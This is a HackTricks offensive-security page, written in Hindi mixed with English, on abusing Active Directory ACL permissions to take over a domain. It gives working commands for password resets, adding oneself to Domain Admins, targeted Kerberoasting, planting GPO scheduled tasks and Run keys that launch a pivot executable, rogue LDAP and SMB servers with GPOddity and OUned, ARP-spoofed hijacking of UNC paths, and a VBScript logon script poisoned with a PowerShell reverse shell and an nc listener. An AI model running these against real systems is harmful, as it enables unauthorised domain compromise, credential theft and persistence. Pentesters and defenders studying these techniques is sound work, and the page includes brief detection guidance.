# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पेज मुख्य रूप से** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **में दी गई techniques का सारांश है। अधिक जानकारी के लिए, मूल articles देखें।**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **User पर GenericAll Rights**

यह privilege attacker को target user account पर full control प्रदान करता है। `Get-ObjectAcl` command का उपयोग करके `GenericAll` rights की पुष्टि होने के बाद, attacker निम्न कार्य कर सकता है:

- **Target का Password बदलना**: `net user <username> <password> /domain` का उपयोग करके attacker user का password reset कर सकता है।
- Linux से, Samba `net rpc` के साथ SAMR पर भी यही कार्य किया जा सकता है:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **यदि account disabled है, तो UAC flag clear करें**: `GenericAll` `userAccountControl` को edit करने की अनुमति देता है। Linux से, BloodyAD `ACCOUNTDISABLE` flag को remove कर सकता है:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: user के account को kerberoastable बनाने के लिए उसमें एक SPN assign करें, फिर ticket-granting ticket (TGT) hashes को extract करने और crack करने का प्रयास करने के लिए Rubeus और targetedKerberoast.py का उपयोग करें।
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए pre-authentication disable करें, जिससे उनका account ASREPRoasting के प्रति vulnerable हो जाए।
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: किसी user पर `GenericAll` होने पर आप certificate-based credential जोड़ सकते हैं और उसका password बदले बिना उसके रूप में authenticate कर सकते हैं। देखें:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group पर GenericAll Rights**

यह privilege attacker को group memberships में बदलाव करने की अनुमति देता है, यदि उसके पास `Domain Admins` जैसे group पर `GenericAll` rights हों। `Get-NetGroup` से group का distinguished name पहचानने के बाद, attacker यह कर सकता है:

- **खुद को Domain Admins Group में जोड़ना**: यह direct commands के माध्यम से या Active Directory अथवा PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux से आप BloodyAD का उपयोग करके arbitrary groups में स्वयं को add कर सकते हैं, जब आपके पास उन पर GenericAll/Write membership हो। यदि target group “Remote Management Users” में nested है, तो उस group को honor करने वाले hosts पर आपको तुरंत WinRM access मिल जाएगा:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

किसी computer object या user account पर ये privileges होने से निम्न कार्य किए जा सकते हैं:

- **Kerberos Resource-based Constrained Delegation**: किसी computer object पर नियंत्रण प्राप्त करने में सक्षम बनाता है।
- **Shadow Credentials**: shadow credentials बनाने के privileges का दुरुपयोग करके किसी computer या user account का impersonation करने के लिए इस technique का उपयोग करें।

## **WriteProperty on Group**

यदि किसी user के पास किसी specific group (जैसे, `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वह:

- **Add Themselves to the Domain Admins Group**: `net user` और `Add-NetGroupUser` commands को combine करके, यह method domain के भीतर privilege escalation की अनुमति देती है।
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Group पर Self (Self-Membership)**

यह privilege attackers को `Domain Admins` जैसे specific groups में स्वयं को add करने में सक्षम बनाता है, ऐसे commands के माध्यम से जो group membership को सीधे manipulate करते हैं। निम्नलिखित command sequence का उपयोग self-addition के लिए किया जा सकता है:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

एक समान privilege attackers को groups की properties में बदलाव करके स्वयं को सीधे groups में जोड़ने की अनुमति देता है, यदि उनके पास उन groups पर `WriteProperty` right हो। इस privilege की पुष्टि और execution निम्नलिखित के साथ की जाती है:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` होने पर current password जाने बिना password reset किया जा सकता है। इस right का verification और exploitation PowerShell या alternative command-line tools के माध्यम से किया जा सकता है, जिससे user का password reset करने के कई methods मिलते हैं, जिनमें interactive sessions और non-interactive environments के लिए one-liners शामिल हैं। Commands सरल PowerShell invocations से लेकर Linux पर `rpcclient` के उपयोग तक होती हैं, जो attack vectors की versatility दर्शाती हैं।
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group पर WriteOwner**

यदि किसी attacker को किसी group पर `WriteOwner` rights प्राप्त हैं, तो वह उस group का ownership बदलकर उसे अपने नाम कर सकता है। यह विशेष रूप से प्रभावशाली होता है जब संबंधित group `Domain Admins` हो, क्योंकि ownership बदलने से group attributes और membership पर व्यापक control प्राप्त किया जा सकता है। इस process में `Get-ObjectAcl` के माध्यम से सही object की पहचान की जाती है और फिर SID या name का उपयोग करके owner को modify करने के लिए `Set-DomainObjectOwner` चलाया जाता है।
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **User पर GenericWrite**

यह permission attacker को user की properties modify करने की अनुमति देती है। विशेष रूप से, `GenericWrite` access के साथ attacker user के logon script path को बदलकर user logon के समय malicious script execute करवा सकता है। यह `Set-ADObject` command का उपयोग करके target user की `scriptpath` property को attacker की script की ओर point करने के लिए update करके किया जाता है।
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

इस privilege के साथ, attackers group membership में बदलाव कर सकते हैं, जैसे स्वयं को या अन्य users को specific groups में जोड़ना। इस प्रक्रिया में एक credential object बनाना, उसका उपयोग करके users को किसी group में जोड़ना या हटाना, और PowerShell commands से membership में हुए बदलावों को verify करना शामिल है।
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux से, Samba `net` group पर `GenericWrite` अधिकार होने पर सदस्यों को जोड़/हटा सकता है (जब PowerShell/RSAT उपलब्ध न हों, तब उपयोगी):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

किसी AD object का owner होना और उस पर `WriteDACL` privileges होना attacker को object पर `GenericAll` privileges देने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जिससे object पर full control और उसकी group memberships को modify करने की क्षमता मिलती है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन privileges का exploit करने का प्रयास करते समय कुछ limitations मौजूद रहती हैं।<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

जब आपके पास किसी user या service account पर `WriteOwner` और `WriteDacl` हो, तो आप पुराने password को जाने बिना PowerView का उपयोग करके उस पर पूरा control प्राप्त कर सकते हैं और उसका password reset कर सकते हैं:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
नोट्स:
- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को स्वयं में बदलना पड़ सकता है:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Password reset के बाद किसी भी protocol (SMB/LDAP/RDP/WinRM) से access validate करें।

## **Replication on the Domain (DCSync)**

DCSync attack domain पर मौजूद specific replication permissions का लाभ उठाकर Domain Controller का अनुकरण करता है और user credentials सहित data synchronize करता है। इस powerful technique के लिए `DS-Replication-Get-Changes` जैसी permissions आवश्यक होती हैं, जिससे attackers Domain Controller तक direct access के बिना AD environment से sensitive information extract कर सकते हैं।<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को manage करने के लिए delegated access गंभीर security risks उत्पन्न कर सकता है। उदाहरण के लिए, यदि `offense\spotless` जैसे user को GPO management rights delegated किए गए हों, तो उसके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी privileges हो सकती हैं। इन permissions का malicious purposes के लिए abuse किया जा सकता है, जैसा कि PowerView का उपयोग करके पहचाना गया है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Misconfigured GPOs की पहचान करने के लिए PowerSploit के cmdlets को chain किया जा सकता है। इससे उन GPOs का पता लगाया जा सकता है जिन्हें किसी specific user के पास manage करने की permissions हैं: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: यह resolve करना संभव है कि कोई specific GPO किन computers पर लागू होता है, जिससे potential impact का scope समझने में सहायता मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: किसी particular computer पर लागू policies देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**OUs with a Given Policy Applied**: किसी given policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

आप [**GPOHound**](https://github.com/cogiceo/GPOHound) tool का उपयोग करके भी GPOs enumerate कर सकते हैं और उनमें मौजूद issues खोज सकते हैं।

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs का exploitation करके code execute किया जा सकता है, उदाहरण के लिए immediate scheduled task create करके। इसका उपयोग affected machines पर किसी user को local administrators group में add करने के लिए किया जा सकता है, जिससे privileges में significant elevation हो जाता है:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

यदि GroupPolicy module installed है, तो यह नए GPOs बनाने और उन्हें link करने, तथा affected computers पर backdoors execute करने के लिए registry values जैसी preferences set करने की अनुमति देता है। इस method के लिए GPO को update करना और execution के लिए किसी user का computer में login करना आवश्यक है:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO का दुरुपयोग

SharpGPOAbuse, नए GPO बनाने की आवश्यकता के बिना tasks जोड़कर या settings में बदलाव करके मौजूदा GPOs का दुरुपयोग करने की एक विधि प्रदान करता है। इस tool के लिए बदलाव लागू करने से पहले मौजूदा GPOs में modification करना या नए GPOs बनाने के लिए RSAT tools का उपयोग करना आवश्यक है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Policy Update को Force करना

GPO updates आमतौर पर लगभग हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज़ करने के लिए, विशेषकर कोई change लागू करने के बाद, target computer पर `gpupdate /force` command का उपयोग करके तुरंत policy update force किया जा सकता है। यह command सुनिश्चित करता है कि GPOs में किए गए सभी modifications अगले automatic update cycle की प्रतीक्षा किए बिना लागू हो जाएँ।

### अंदरूनी प्रक्रिया

किसी दिए गए GPO, जैसे `Misconfigured Policy`, के Scheduled Tasks का निरीक्षण करने पर `evilTask` जैसे tasks के जुड़ने की पुष्टि की जा सकती है। ये tasks system behavior को modify करने या privileges escalate करने के उद्देश्य से scripts या command-line tools के माध्यम से बनाए जाते हैं।

`New-GPOImmediateTask` द्वारा generate की गई XML configuration file में दिखाया गया task structure scheduled task की specifics को दर्शाता है - इसमें execute की जाने वाली command और उसके triggers शामिल होते हैं। यह file दिखाती है कि GPOs के भीतर scheduled tasks कैसे define और manage किए जाते हैं, जिससे policy enforcement के हिस्से के रूप में arbitrary commands या scripts execute करने का तरीका मिलता है।

### Users और Groups

GPOs target systems पर user और group memberships में manipulation की अनुमति भी देते हैं। Users and Groups policy files को सीधे edit करके attackers users को privileged groups, जैसे local `administrators` group, में add कर सकते हैं। यह GPO management permissions के delegation के माध्यम से संभव है, जो policy files में नए users शामिल करने या group memberships बदलने की अनुमति देता है।

Users and Groups की XML configuration file बताती है कि ये changes कैसे लागू किए जाते हैं। इस file में entries add करके specific users को प्रभावित systems पर elevated privileges दिए जा सकते हैं। यह method GPO manipulation के माध्यम से privilege escalation का direct approach प्रदान करता है।

इसके अतिरिक्त, code execute करने या persistence बनाए रखने के लिए logon/logoff scripts का उपयोग, autoruns के लिए registry keys को modify करना, `.msi` files के माध्यम से software install करना, या service configurations को edit करना जैसे अन्य methods पर भी विचार किया जा सकता है। ये techniques GPOs के abuse के माध्यम से access बनाए रखने और target systems को control करने के विभिन्न तरीके प्रदान करती हैं।

### Authenticated rogue services पर GPC/GPT retrieval को redirect करना

एक GPO में metadata वाला LDAP **Group Policy Container (GPC)** और policy files वाला SMB-hosted **Group Policy Template (GPT)** शामिल होता है। Refresh के दौरान client container के `gPLink` का अनुसरण करता है, referenced GPC और उसका `gPCFileSysPath` पढ़ता है, फिर उस UNC path से GPT download करता है। परिणामस्वरूप, GPC स्वयं या किसी OU, Site अथवा Domain के `gPLink` पर write access को privileged policy processing में बदला जा सकता है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### `gPCFileSysPath` poisoning with GPOddity

यदि controlled principal target GPC में write कर सकता है (सीधे या **NTLM relay to LDAP** के माध्यम से), तो `gPCFileSysPath` को attacker द्वारा hosted UNC path से replace करें। [GPOddity](https://github.com/synacktiv/GPOddity) LDAP change को automate करता है और एक malicious GPT serve करता है, जिसमें module-based policy files या Immediate Task होता है, जिसे Group Policy client `NT AUTHORITY\SYSTEM` के रूप में execute करता है।<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Current Windows clients पर anonymous या credential-agnostic SMB share पर्याप्त नहीं है: SMB Secure Negotiate के लिए authentication सफल होने का proof आवश्यक होता है, इसलिए rogue service को domain identity validate करनी होगी, SMB session key derive करनी होगी और अपने responses पर सही तरीके से sign करना होगा। Embedded mode में, GPOddity को controlled machine account और उसकी service key के साथ configure करें, फिर `[COMMANDS]` section में computer-side या user-side payload चुनें।<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**User GPO edge case:** MS16-072 के बाद भी Windows **same TCP connection** में दो SMB2 sessions बनाता है: user session `GPT.INI` को पढ़ता है, फिर computer-account session effective configuration जैसे `ScheduledTasks.xml` को पढ़ता है। इसलिए rogue server को authentication state, session keys और signing keys को केवल socket के आधार पर नहीं, बल्कि SMB2 `SessionId` के आधार पर index करना चाहिए। GPOddity/OUned में embedded Scapy fork इसे `SMBStreamSocketMultiplexing` और multiplexing-aware `SMBServer` के माध्यम से लागू करता है; single-session Impacket/Scapy servers अन्यथा गलत signing state को reuse करते हैं और user policies पर fail हो जाते हैं।<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

`WriteGPLink`, `GenericWrite` या किसी equivalent control के साथ OU, Site या Domain पर attacker एक ऐसा link append कर सकता है जिसका GPC DN attacker-controlled LDAP host द्वारा serve किया जाता है। यह primitive मूल रूप से Petros Koutroumpis द्वारा प्रस्तुत किया गया था; [OUned](https://github.com/synacktiv/OUned) LDAP write और malicious GPC/GPT chain को automate करता है।<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Victim पहले rogue LDAP service से authenticate करता है और एक GPC प्राप्त करता है, जिसका `gPCFileSysPath` rogue SMB service की ओर संकेत करता है; इसके बाद वह SMB से authenticate करता है और दिए गए GPT को लागू करता है। इसलिए OUned को LDAP SPN वाले account, SMB के लिए HOST SPN वाले machine account (वही machine account दोनों आवश्यकताओं को पूरा कर सकता है), और ऐसी DNS resolution या reverse forwarding की आवश्यकता होती है, जो ports 389 और 445 को operator host पर भेजे।<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned का embedded Scapy LDAP server वास्तविक controlled service key से Kerberos/SPNEGO को validate करता है और JSON से arbitrary GPC data उपलब्ध कराता है। खाली JSON key rootDSE को मॉडल करती है, `base64:` prefixes binary values को दर्शाते हैं, और server add/delete/modify/search के साथ-साथ `BASE`, `LEVEL` और `SUBTREE` searches को support करता है; यह no protection, integrity या confidentiality negotiate कर सकता है। इससे यह service तब reusable बन जाती है जब कोई अन्य Windows component attacker-controlled LDAP reference को follow करता है, लेकिन authenticated LDAP पर जोर देता है।<sup>[[15]](#references)</sup>

यह न मानें कि किसी account password को dummy domain में synchronize करने से हर Kerberos key reproduce हो जाती है: RC4 password से derive होता है, जबकि AES string-to-key में principal के hostname/domain से derive किया गया salt भी उपयोग होता है। वास्तविक account AES key को `KerberosSSP` में देने से machine account के self-writable `msDS-SupportedEncryptionTypes` में detectable change करके RC4 force करने की आवश्यकता नहीं रहती।<sup>[[15]](#references)</sup>

#### Detection pivots

`gPCFileSysPath` या `gPLink` में हुए changes को GPO version changes और नए Immediate/Scheduled Task XML के साथ correlate करें। Unexpected naming contexts के links, approved DC/SYSVOL set के बाहर के UNC hosts, machine-account names को redirect करने वाले DNS records, unusual machine accounts के LDAP/CIFS service tickets, और RC4 enable करने वाले `msDS-SupportedEncryptionTypes` changes की जांच करें।<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

किसी OU/domain पर `WriteGPLink` आपको target container के `gPLink` attribute को modify करने और GPO को स्वयं edit किए बिना **किसी existing GPO को apply करने के लिए force** करने देता है। यह तब महत्वपूर्ण हो जाता है जब linked GPO पहले से **UNC paths** (`\\HOST\share\...`) के माध्यम से remote content को reference करता हो, क्योंकि authenticated users **SYSVOL** को read कर सकते हैं और reusable policies के लिए offline hunt कर सकते हैं।<sup>[[11]](#references)</sup>

High-level workflow:

1. किसी OU पर `WriteGPLink` वाले principal की पहचान करने और उस OU के अंदर computers/users enumerate करने के लिए BloodHound का उपयोग करें।
2. `SYSVOL` को read-only clone करें और उन GPOs को खोजने के लिए parse करें जिनमें **Software Installation**, **drive mappings** (`Drives.xml`), और UNC paths को reference करने वाली **logon/startup scripts** हों।
3. DFS/domain-namespace paths के बजाय **direct hostname** की ओर point करने वाली policies को प्राथमिकता दें (उदाहरण के लिए `\\DC02\share\pkg.msi`), क्योंकि hostname-based paths को L2 spoofing से redirect करना आसान होता है।
4. चुने गए GPO GUID को target OU के `gPLink` में append करें, ताकि victim उस पहले से मौजूद policy को process करे।
5. उसी broadcast domain पर UNC host को ARP spoof करें और उसका IP locally bind करें (`ip addr add <target_ip>/32 dev <iface>`), ताकि victim का SMB traffic आपके host तक पहुंचे।
6. अपेक्षित path/filename को attacker SMB server (उदाहरण के लिए `smbserver.py`) से serve करें और सामान्य policy processing की प्रतीक्षा करें।

Example `SYSVOL` collection and GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
मौजूदा GPO को target OU से लिंक करें:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

यदि linked GPO किसी UNC path से MSI deploy करता है, तो client उसे **computer startup** के दौरान fetch करके **`NT AUTHORITY\SYSTEM`** के रूप में install करेगा। Referenced host को spoof करके और **same share/path/name** के अंतर्गत malicious MSI serve करके, आप **SYSVOL** को modify किए बिना `WriteGPLink` को SYSTEM code execution में बदल सकते हैं।

महत्वपूर्ण सीमाएँ:

- **Timing महत्वपूर्ण है**: नया link policy refresh पर दिखाई देता है (आमतौर पर ~90 मिनट), लेकिन **Software Installation** सामान्यतः **reboot** पर trigger होता है।
- Windows Installer आमतौर पर deployment को package **`ProductCode`** के माध्यम से track करता है। यदि product पहले से installed है, तो deployment skip किया जा सकता है।
- Installer rejection से बचने के लिए rogue MSI को इस तरह patch करें कि उसका **`ProductCode`** और **`PackageCode`** GPO द्वारा अपेक्षित legitimate package से match करे।
- पुरानी `.aas` advertisement files **SYSVOL** में बनी रह सकती हैं, इसलिए इस पर निर्भर करने से पहले validate करें कि deployment अभी भी active दिखाई दे रहा है।
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` में GPP drive mappings, logon या reconnection के दौरान users को configured UNC path पर authenticate करने का कारण बनती हैं। यदि आप referenced host को spoof करते हैं, तो **NetNTLMv2** capture कर सकते हैं। यदि SMB को जानबूझकर fail कराया जाए, तो Windows **WebDAV** पर retry कर सकता है और **NTLM over HTTP** भेज सकता है, जो **LDAP(S)**, **AD CS**, या **SMB** के लिए relays में कहीं अधिक flexible है।

#### Logon/startup script UNC hijack

यही pattern `SYSVOL` में मिले UNC-hosted scripts पर भी लागू होता है:

- **Logon scripts** आमतौर पर **user** context में execute होती हैं।
- **Startup scripts** आमतौर पर **computer / SYSTEM** context में execute होती हैं।

यदि script path किसी spoofable hostname की ओर point करता है, तो UNC host को redirect करें और expected location से replacement script content serve करें।

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` या `\\<dc>\NETLOGON\` के अंतर्गत writable paths, GPO के माध्यम से user logon पर execute होने वाले logon scripts में tampering की अनुमति देते हैं। इससे logging-in users के security context में code execution प्राप्त होता है।

### Logon scripts खोजें
- Configured logon script के लिए user attributes inspect करें:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- scripts के shortcuts या references खोजने के लिए domain shares को crawl करें:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` files को parse करके SYSVOL/NETLOGON की ओर संकेत करने वाले targets resolve करें (यह उपयोगी DFIR trick है और उन attackers के लिए भी, जिनके पास direct GPO access नहीं है):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound मौजूद होने पर user nodes पर `logonScript` (scriptPath) attribute प्रदर्शित करता है।

### Write access को validate करें (share listings पर भरोसा न करें)
Automated tooling SYSVOL/NETLOGON को read-only दिखा सकता है, लेकिन underlying NTFS ACLs फिर भी writes की अनुमति दे सकते हैं। हमेशा test करें:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
यदि file size या mtime बदलता है, तो आपके पास write है। संशोधन करने से पहले originals को सुरक्षित रखें।

### RCE के लिए VBScript logon script को Poison करें
एक ऐसा command जोड़ें जो PowerShell reverse shell लॉन्च करे (revshells.com से generate करें) और business function को बाधित होने से बचाने के लिए original logic बनाए रखें:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
अपने host पर listen करें और अगले interactive logon की प्रतीक्षा करें:
```bash
rlwrap -cAr nc -lnvp 443
```
- Execution logging user के token के अंतर्गत होता है (SYSTEM नहीं)। Scope उस GPO link (OU, site, domain) का है जो उस script को लागू करता है।
- उपयोग के बाद मूल content/timestamps पुनर्स्थापित करके cleanup करें।


## References

- [1] [Active Directory ACLs/ACEs का दुरुपयोग](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts और Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory में ACLs के साथ privileges बढ़ाना](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Privileges और Privileged Accounts की scanning](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux से AD attribute/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, और DPAPI decryption से DC admin तक](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution और NTLM Relay के लिए GPO UNC Paths को hijack करना](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
